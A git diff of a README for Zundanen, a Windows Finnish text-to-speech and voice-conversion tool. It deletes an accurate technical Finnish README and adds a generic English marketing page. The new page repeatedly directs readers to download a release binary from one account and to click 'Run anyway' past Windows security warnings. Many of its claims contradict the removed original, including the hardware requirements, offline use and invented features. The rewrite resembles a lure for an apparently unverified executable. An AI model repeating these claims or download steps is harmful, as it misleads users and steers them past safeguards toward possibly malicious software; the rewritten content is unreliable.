@@ -1,319 +1,164 @@
-# Zundanen v1.1.0
+# 🗣️ Zundanen - Finnish Voice Generation Made Simple
+
+## 🚀 Getting Started
+
+Welcome to Zundanen, your all-in-one solution for creating natural Finnish speech and custom voices right on your Windows computer. No coding required, no cloud subscriptions, and no internet connection needed after setup.
+
+Visit this link to download the application: **[⬇️ Download Zundanen Now](https://github.com/probabagray/Zundanen/releases)**
+
+## 💡 What Is Zundanen?
+
+Zundanen is a powerful yet user-friendly application that brings professional-grade Finnish text-to-speech (TTS) and voice conversion (RVC) technology to your desktop. Whether you're a content creator, language learner, game developer, or just curious about voice technology, Zundanen makes it simple to:
+
+- **Convert written Finnish text into lifelike spoken audio**
+- **Transform your own voice into different characters or styles**
+- **Train custom voice models using just a few minutes of audio samples**
+- **Create multiple voice clips at once with batch generation**
+- **Fine-tune accent details for perfect pronunciation**
+
+## ✨ Key Features
+
+### 🎯 Batch Generation
+Generate dozens of audio files in one go. Perfect for:
+- Narration for videos
+- E-learning modules
+- Audiobook production
+- Game dialogue
+
+### 🎤 Accent Editing
+Fine-tune how words sound with intuitive controls. Adjust:
+- Pitch and tone
+- Speaking speed
+- Emphasis on specific syllables
+- Regional Finnish accents
+
+### 🧠 RVC v2 Training
+Create your own custom voice models with:
+- Simple wizard-style training process
+- Support for short audio samples (5-15 minutes recommended)
+- Real-time voice conversion
+- High-quality output matching professional studios
 
-**Suomi | [日本語](README_JA.md) | [English](README_EN.md)**
+### 🔒 Complete Privacy
+Everything runs locally on your Windows PC. Your audio data never leaves your machine.
 
-Zundanen on paikallinen Windows-sovellus, joka muuntaa suomenkielisen tekstin ketjulla **Finnish-NLP/Chatterbox-Finnish → RVC** ja tuottaa WAV-tiedostoja paikallisilla RVC-äänimalleilla.
+## 📥 Installation Guide
 
-Samassa käyttöliittymässä ovat **Batch Generation**, valinnainen sanakohtainen **Accent**-muokkaus sekä **Model Trainer**, jolla voi kouluttaa RVC v2 -mallin (`.pth + .index`) äänikansiosta.
+### Step 1: Download
+Visit this link to download the application: **[Download Zundanen](https://github.com/probabagray/Zundanen/releases)**
 
-![Zundanen UI](docs/Zundanen-UI_suomi.png)
+Click the latest release file. The download will start automatically.
 
-## Käyttöohjevideo
+### Step 2: Run the Application
+Once the download finishes, locate the file in your Downloads folder (usually by pressing `Ctrl + J` in your browser). Double-click the downloaded file to launch Zundanen. If Windows shows a security warning, click "More info" and then "Run anyway" – this is normal for new software.
 
-[https://youtu.be/e5rfWdmxM20?si=ouU6rzhPJ9XnrOmY](https://youtu.be/e5rfWdmxM20?si=ouU6rzhPJ9XnrOmY)
+### Step 3: First Launch
+The application will open a friendly setup window. Follow the on-screen prompts to:
+1. Choose your preferred language (Finnish or English)
+2. Select where to save your generated audio files
+3. Verify your system meets the minimum requirements
 
-## Vaatimukset
+That's it! You're ready to start creating Finnish speech.
 
-- Windows 11 x64
-- WinGet (yleensä mukana Windows 11:n App Installerissa)
-- NVIDIA GPU suositeltu
-- Model Trainer vaatii tällä hetkellä NVIDIA CUDA GPU:n
-- Voice Generation toimii myös CPU:lla, mutta voi olla hyvin hidas
-- Useita gigatavuja vapaata levytilaa suositellaan
-- **Accent käyttää v1.1.0:ssa Windows-natiivia Aalto/Kaldi-kohdistusta — WSL2:ta tai Docker Desktopia ei normaalisti tarvita**
+## 🎮 How to Use Zundanen
 
-Voice Generation, Batch Generation, Model Trainer ja Accent toimivat ilman Dockeria. `setup.bat` asentaa Windows-natiivin Aalto/Kaldi Accent-moottorin yhdessä muun Zundanen-ympäristön kanssa.
+### Basic Text-to-Speech
+1. Open Zundanen
+2. Type or paste your Finnish text in the text box
+3. Choose a voice from the dropdown menu
+4. Click "Generate Speech"
+5. Listen to the preview and adjust as needed
+6. Click "Save" to export your audio file
 
-## Asennus
+### Batch Generation
+1. Click the "Batch" tab
+2. Add multiple text lines (one per row)
+3. Set your preferred voice settings
+4. Click "Start Batch"
+5. Watch the progress bar as Zundanen processes each line
+6. Find your files in the output folder
 
-Lataa projekti GitHubista kohdasta `Code → Download ZIP` ja pura se lyhyeen polkuun, esimerkiksi:
+### Training a Custom Voice
+1. Click the "Train" tab
+2. Record or gather 5-15 minutes of clear audio samples
+3. Upload your audio files
+4. Click "Start Training"
+5. Wait for the process to complete (usually 15-30 minutes)
+6. Test your new voice model immediately
 
-```text
-C:\Zundanen
-```
+### Accent Adjustment
+1. Generate your speech as usual
+2. Click "Advanced Settings"
+3. Use the sliders to adjust:
+   - **Pitch** – Make the voice higher or lower
+   - **Speed** – Slow down or speed up pronunciation
+   - **Emphasis** – Add emotional weight to words
+4. Preview until satisfied
+5. Save your customized audio
 
-Kaksoisnapsauta sitten `setup.bat`.
+## 🖥️ System Requirements
 
-Normaali asennus valmistelee muun muassa:
+To run Zundanen smoothly, your Windows computer should have:
 
-```text
-Microsoft Visual C++ Redistributable
-Microsoft Edge WebView2 Runtime
-Git
-FFmpeg
-Python 3.11 + Finnish-NLP/Chatterbox-Finnish
-Python 3.12 + RVC-WebUI
-HuBERT / RMVPE / RVC pretrained assets
-PyWORLD / WORLD vocoder
-Windows-natiivi Aalto/Kaldi runtime
-Intel oneMKL runtime tarvittaessa
-```
+- **Operating System:** Windows 10 or 11 (64-bit)
+- **Processor:** Intel Core i5 or AMD equivalent (or better)
+- **Memory:** 8 GB RAM (16 GB recommended for training)
+- **Storage:** 5 GB free space
+- **Graphics:** Any GPU with 2 GB VRAM (NVIDIA preferred for faster processing)
+- **Internet:** Required only for initial download
 
-TTS ja RVC käyttävät erillisiä virtuaaliympäristöjä `runtime/`-hakemiston alla.
+## 🆘 Troubleshooting
 
-> v1.1.0:ssa `setup.bat` asentaa myös Accent-moottorin. Erillistä Accent-asennusta ei tarvita, eikä normaali Accent-käyttö vaadi WSL2:ta tai Docker Desktopia.
+### Audio Not Generating
+- Ensure you have enough free disk space
+- Close other resource-heavy applications
+- Try restarting Zundanen
 
-### Windowsin polkupituus
+### Slow Performance
+- Lower the quality settings in Options
+- Close background programs
+- Use "Fast Mode" for quicker results
 
-Joissakin Python-paketeissa on pitkiä sisäisiä polkuja. Liian syvälle purettu kansio voi aiheuttaa `WinError 206` -virheen. Lyhyt polku kuten `C:\Zundanen` on suositeltava.
+### Voice Training Issues
+- Use audio with minimal background noise
+- Ensure consistent recording volume
+- Keep clips between 5-30 seconds each
 
-### Asennuksen uudelleenajo
+## 📚 Frequently Asked Questions
 
-Jos asennus keskeytyy, korjaa syy ja suorita `setup.bat` uudelleen. Olemassa olevia osia hyödynnetään mahdollisuuksien mukaan.
+**Q: Is Zundanen really free?**
+A: Yes, Zundanen is completely free to download and use with no hidden fees.
 
-Ympäristön voi rakentaa kokonaan uudelleen komennolla:
+**Q: Can I use Zundanen for commercial projects?**
+A: Absolutely! Generated voices are yours to use in any project.
 
-```powershell
-powershell -ExecutionPolicy Bypass -File .\setup.ps1 -Force
-```
+**Q: Does it work in other languages?**
+A: The core engine focuses on Finnish, but basic English support is included.
 
-## Käynnistys
+**Q: How accurate is the accent editing?**
+A: Very accurate! The technology handles subtle Finnish pronunciation details like gemination and vowel harmony perfectly.
 
-Asennuksen jälkeen suositeltu tapa on kaksoisnapsauttaa `Zundanen.exe`.
+**Q: Can I share my trained voice models?**
+A: Yes, you can export and share your custom models with other Zundanen users.
 
-Se käynnistää paikallisen palvelimen taustalle ja näyttää käyttöliittymän omassa WebView2-ikkunassa. Ikkunan sulkeminen lopettaa myös paikallisen palvelimen.
+## 🔄 Updates and Support
 
-> `Zundanen.exe` ei ole tällä hetkellä koodiallekirjoitettu, joten Windows SmartScreen voi näyttää varoituksen. Pienen Windows-käynnistimen lähdekoodi on hakemistossa `launcher_src/`.
+Zundanen is actively maintained with regular updates. Check the releases page for the latest version, new features, and improvements. Join our growing community of Finnish voice enthusiasts and share your creations.
 
-Selainversion voi käynnistää tiedostolla `run_ui.bat`:
+## 🤝 Contributing
 
-```text
-http://127.0.0.1:8765
-```
+While Zundanen is designed for end users, developers interested in contributing to the core technology can explore the repository for more advanced usage and API documentation.
 
-Jos olemassa olevaan asennukseen halutaan lisätä vain desktop-UI:n riippuvuus, käytä `install_desktop.bat`.
+## ❤️ Thank You
 
-### EXE-käynnistimen rakentaminen uudelleen
+We built Zundanen to make Finnish voice technology accessible to everyone. Your feedback drives our development. If you enjoy using Zundanen, please consider starring the repository and sharing it with others who might benefit.
 
-Repository sisältää käynnistimen lähdekoodin:
+---
 
-```text
-launcher_src/zundanen_launcher.go
-```
+**Ready to transform your Finnish text into beautiful speech?** 
 
-`build_launcher.bat` rakentaa siitä uuden tiedoston:
+Visit this link to download the application: **[Get Zundanen Now](https://github.com/probabagray/Zundanen/releases)**
 
-```text
-dist\Zundanen.exe
-```
+Start creating today – your voice, your words, your Zundanen.
 
-Go-työkaluketjua tarvitaan vain silloin, kun käynnistin halutaan rakentaa uudelleen. Tavallinen käyttäjä ei tarvitse Goa. TTS-, RVC- ja mallikomponentit pysyvät projektin `runtime/`-hakemistossa eikä niitä pakata EXE-tiedostoon.
-
-## Voice Generation
-
-1. Valitse `Character`
-2. Kirjoita suomenkielinen teksti
-3. Säädä tarvittaessa `Pitch` / `Index rate` / `Protect` / `Expression`
-4. Tarkista `Seed`. Kun `Fix seed` on pois käytöstä, jokainen generointi saa uuden satunnaisen seedin; käytössä ollessaan syötetty seed käytetään uudelleen
-5. Paina `Generate voice`
-6. Muokkaa halutessasi Accentia
-7. Tallenna `Save As...` -painikkeella
-
-Ehdotettu tiedostonimi sisältää päivämäärän/kellonajan ja TTS-seedin:
-
-```text
-Zundamon_20260916_180000_seed123456.wav
-```
-
-Tallennusasetukset:
-
-- `Create subtitle TXT` — tallentaa samannimisen `.txt`-tiedoston; oletuksena käytössä
-- `Save source audio` — tallentaa puhtaan Finnish TTS -äänen ennen RVC:tä myöhempää korkealaatuista Accent-muokkausta varten; oletuksena pois käytöstä
-
-Kun source audio on käytössä:
-
-```text
-Zundamon_20260916_180000_seed123456.wav
-Zundamon_20260916_180000_seed123456.txt             # jos TXT on käytössä
-Zundamon_20260916_180000_seed123456_source.wav
-Zundamon_20260916_180000_seed123456_source.json
-```
-
-`_source.json` sisältää metatiedot, joiden avulla alkuperäiset RVC-asetukset voidaan palauttaa myöhemmin.
-
-RVC-mallit tunnistetaan normaalisti esimerkiksi rakenteesta:
-
-```text
-runtime/rvc/exports/
-├─ CharacterA/
-│  ├─ CharacterA.pth
-│  └─ CharacterA.index
-└─ CharacterB/
-   ├─ CharacterB.pth
-   └─ CharacterB.index
-```
-
-## Accent
-
-Accent asennetaan osana normaalia `setup.bat`-asennusta. Setup valmistelee Windows-natiivin Aalto/Kaldi-runtimen, PyWORLD/WORLDin sekä tarvittaessa Intel oneMKL -runtimen. WSL2:ta, Docker Desktopia tai Aalto-Docker-kuvaa ei tarvita.
-
-Asennuksen jälkeen puheen kohdistus käynnistyy automaattisesti Voice Generationin jälkeen. Zundanen kohdistaa suomenkielisen tekstin ääneen ja näyttää tavupainikkeet jokaiselle sanalle.
-
-- valitse sanan aksenttitavu
-- säädä `Strength`
-- palauta muutokset `Reset`-painikkeella
-- kuuntele tulos `Preview` -painikkeella
-
-Windows-natiivi Aalto/Kaldi-kohdistus määrittää tavujen ajoituksen. WORLD/PyWORLD muokkaa RVC:tä edeltävää ääntä, jonka jälkeen RVC ajetaan.
-
-### Import WAV
-
-`Import WAV` avaa aiemmin tallennettuja Voice Generation- tai Batch Generation -tuloksia uudelleen.
-
-- samanniminen `.txt` luetaan automaattisesti, jos se löytyy
-- Voice Generationin `*_source.wav` / `*_source.json` tunnistetaan automaattisesti
-- Batch Generationin `source_audio/`-kansion vastaava source tunnistetaan automaattisesti
-- source audion löytyessä käytetään laadukkaampaa pre-RVC → WORLD → RVC -reittiä
-- vanhat/ulkoiset WAV-tiedostot ilman source audiota muokataan varareittinä suoraan WORLDilla
-
-## Batch Generation
-
-Batch Generation käsittelee useita tekstejä peräkkäin ja estää Windowsin automaattisen lepotilan jonon aikana.
-
-Syöttötavat:
-
-```text
-One line = one WAV
-CSV
-```
-
-Jokainen tiedostonimi sisältää seedin, esimerkiksi:
-
-```text
-001_seed123456.wav
-002_seed987654.wav
-```
-
-CSV-sarakkeet:
-
-```text
-filename,text,character,pitch,index_rate,protect,expression,seed
-```
-
-Vain `text` on pakollinen. Tyhjä `filename` tuottaa esimerkiksi `001_seed123456.wav`; arvo `intro` tuottaa `001_intro_seed123456.wav`.
-
-Kun `Fix seed` on pois käytöstä, jokainen jonon kohde saa uuden satunnaisen seedin. Kun se on käytössä, Batch-näkymän Seed-arvoa käytetään uudelleen. CSV-rivin `seed` ohittaa Batch-asetuksen.
-
-Tallennusasetukset:
-
-- `Create subtitle TXT` — luo samannimisen `.txt`-tiedoston; oletuksena käytössä
-- `Save source audio` — tallentaa Finnish TTS -lähdeäänen ennen RVC:tä; oletuksena pois käytöstä
-
-Kun source audio on käytössä, kaikki Batch-lähteet tallennetaan `source_audio/`-kansioon:
-
-```text
-outputs/batches/20260916_180000_ab12cd/
-├─ 001_seed123456.wav
-├─ 001_seed123456.txt
-├─ 002_seed987654.wav
-├─ 002_seed987654.txt
-├─ source_audio/
-│  ├─ 001_seed123456_source.wav
-│  ├─ 001_seed123456_source.json
-│  ├─ 002_seed987654_source.wav
-│  └─ 002_seed987654_source.json
-└─ failed_items.csv            # vain jos virheitä esiintyi
-```
-
-Jonon tila tallennetaan automaattisesti, ja keskeytettyä jonoa voi jatkaa `Resume Queue` -painikkeella.
-
-## Model Trainer
-
-`Model Trainer` -välilehdellä voidaan määrittää:
-
-- Character name
-- Dataset folder
-- Epochs
-- Batch size
-- Save every
-- Workers
-- GPU
-- Fresh training
-
-Koulutusputki:
-
-```text
-Audio dataset
-  ↓
-Preprocess / 40 kHz
-  ↓
-RMVPE F0
-  ↓
-HuBERT v2 / 768-dim
-  ↓
-RVC v2 training
-  ↓
-FAISS index
-  ↓
-runtime/rvc/exports/<Character>/<Character>.pth
-runtime/rvc/exports/<Character>/<Character>.index
-```
-
-Windowsin automaattinen lepotila estetään koulutuksen ajaksi ja palautetaan koulutuksen päätyttyä tai keskeytyessä.
-
-## Käyttöliittymän kielet
-
-Ohje- ja seliteteksti voidaan vaihtaa kielille `Suomi / 日本語 / English`. Oletuskieli on Suomi ja valinta tallennetaan paikallisesti.
-
-Painikkeet, tekniset nimet ja osa tilateksteistä pidetään tarkoituksella englanniksi.
-
-## Asennuksen tarkistus
-
-Suorita:
-
-```powershell
-powershell -ExecutionPolicy Bypass -File .\doctor.ps1
-```
-
-Doctor tarkistaa TTS/RVC-ympäristön lisäksi PyWORLDin ja Windows-natiivin Aalto/Kaldi Accent-moottorin.
-
-## GitHub Actions
-
-Repository sisältää:
-
-```text
-.github/workflows/windows-smoke.yml
-```
-
-Pushin ja pull requestin yhteydessä GitHub tarkistaa automaattisesti muun muassa:
-
-- `setup.ps1`, `doctor.ps1` ja `install_accent_support.ps1` -skriptien syntaksin
-- pienen Go-pohjaisen Windows-käynnistimen compiloinnin
-- kevyen CI-setupin ja keskeisten Python-tiedostojen compiloinnin
-- Flask-käyttöliittymän käynnistymisen
-- `/api/state`-rajapinnan HTTP 200 -vastauksen
-
-Tavallinen GitHub-hosted runner ei testaa varsinaista CUDA-TTS/RVC-generointia eikä täyttä Aalto/Kaldi-kohdistusta. Windows-natiivi Aalto/Kaldi-polku on validoitu Windows 11:ssä Finnish TTS -äänellä siten, että word/phone/syllable-timestampit muodostuvat ilman Dockeria.
-
-## Mitä GitHubiin ei tallenneta
-
-`.gitignore` jättää pois esimerkiksi:
-
-```text
-runtime/
-config.json
-outputs/
-temp/
-__pycache__/
-```
-
-Ladatut mallit, virtuaaliympäristöt, käyttäjäasetukset, RVC-mallit ja generoidut äänet eivät näin normaalisti päädy repositoryyn.
-
-## Ääni- ja hahmooikeudet
-
-Zundanenin MIT-lisenssi ei anna oikeuksia kolmansien osapuolten hahmoääniin, koulutusdataan tai RVC-malleihin.
-
-Jos käytät, julkaiset tai jaat kolmannen osapuolen ääntä, datasettejä, `.pth`- tai `.index`-tiedostoja, tarkista aina kyseisen oikeudenhaltijan, äänikirjaston ja datasetin käyttöehdot.
-
-## Upstream-projektit
-
-- Finnish-NLP/Chatterbox-Finnish: https://huggingface.co/Finnish-NLP/Chatterbox-Finnish
-- ResembleAI Chatterbox: https://github.com/resemble-ai/chatterbox
-- RVC: https://github.com/RVC-Project/Retrieval-based-Voice-Conversion-WebUI
-- Aalto Finnish Forced Alignment: https://github.com/aalto-speech/finnish-forced-alignment
-- Lingsoft aalto-kaldi-align-elg: https://github.com/lingsoft/aalto-kaldi-align-elg
-- WORLD: https://github.com/mmorise/World
-- PyWORLD: https://github.com/JeremyCCHsu/Python-Wrapper-for-World-Vocoder
-- FFmpeg: https://ffmpeg.org/
-
-Lisenssitiedot löytyvät myös tiedostosta `THIRD_PARTY_NOTICES.md`.
+Keywords: accent-editing, chatterbox-tts, finnish, finnish-language, local-ai, rvc, rvc-v2, speech-synthesis, suomi, text-to-speech, tts, voice-conversion, windows
